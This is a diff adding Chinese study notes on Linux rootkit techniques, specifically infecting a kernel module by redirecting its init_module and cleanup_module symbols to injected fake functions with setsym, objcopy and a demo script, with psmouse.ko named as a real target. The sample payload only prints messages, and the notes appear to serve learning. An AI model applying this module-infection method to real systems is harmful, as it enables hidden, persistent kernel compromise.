@@ -193,6 +193,128 @@ module_exit(acpi_ac_exit);
 
 
 
+通过劫持符号表来进行感染，劫持同模块
+
+```
+int
+noinj_init(void)
+{
+    fm_alert("noinj: %s\n", "Greetings the World!");
+
+    return 0;
+}
+
+void
+noinj_exit(void)
+{
+    fm_alert("noinj: %s\n", "Farewell the World!");
+
+    return;
+}
+
+module_init(noinj_init);
+module_exit(noinj_exit);
+int
+fake_init(void)
+{
+    noinj_init();
+
+    fm_alert("==> NOINJ: %s\n", "GR33TINGS THE W0RLD!");
+
+    return 0;
+}
+
+int
+fake_exit(void)
+{
+    noinj_exit();
+
+    fm_alert("==> NOINJ: %s\n", "FAR3W311 THE W0RLD!");
+
+    return 0;
+}
+```
+
+使用setsym进行修改符号值
+
+```
+// 第一种用法，获取符号的值。
+setsym <module_path> <symbol_name>
+ 
+// 第二种用法，设置符号的值。
+setsym <module_path> <symbol_name> <symbol_value>
+```
+
+
+
+怎么实现模块间感染 
+
+ `.ko`文件是可重定位文件，这意味着我们可以通过`ld`链接它们 
+
+ 有的模块的出入函数前面都加了`static`，即符号只在本目标文件内可见 
+
+使用objcopy工具修改
+
+```
+objcopy：将目标文件的一部分或者全部内容拷贝到另外一个目标文件中，或者实现目标文件的格式转换。
+
+--globalize-symbol=symbolname 
+    让变量symbolname变成全局范围，这样它可以在定义它的文件外部可见。可以多次指定。
+```
+
+
+
+
+
+```
+演示脚本
+// 构建模块。
+$ make
+
+// 复制一份副本用于对照演示。
+$ cp noinj.ko infected.ko
+
+// 将副本的 init_module 符号值改成 fake_init 符号值。
+$ setsym infected.ko init_module $(setsym infected.ko fake_init)
+
+// 将副本的 cleanup_module 符号值改成 fake_exit 符号值。
+$ setsym infected.ko cleanup_module $(setsym infected.ko fake_exit)
+// 加载原始的模块。
+$ insmod noinj.ko
+
+// 卸载载原始的模块。
+$ rmmod noinj
+
+// 加载修改过的副本。
+$ insmod infected.ko
+
+// 卸载修改过的副本。
+$ rmmod noinj // 注意模块名要用宿主的，即 noinj
+```
+
+
+
+因为ubuntu16.04里启动时没有加载video.ko所以不能直接用参考文章里的模块，需要自己找一个
+
+找到了input/mouse/psmouse.ko matches
+
+```
+static int __init psmouse_init(void)
+{
+。。。。。
+}
+
+static void __exit psmouse_exit(void)
+{
+。。。。。
+}
+
+module_init(psmouse_init);
+module_exit(psmouse_exit);
+```
+
+
+
 
 
 
@@ -483,7 +605,7 @@ int main(int argc, char *argv[]) {
 | UDP/IPv4 | /proc/net/udp  |   net/ipv4/udp.c    | udp4_seq_show |
 | UDP/IPv6 | /proc/net/udp6 |   net/ipv6/udp.c    | udp6_seq_show |
 
-
+[参考](https://wohin.me/rootkit/2017/05/11/LinuxRootkitExp-00024.html)
 
 
 
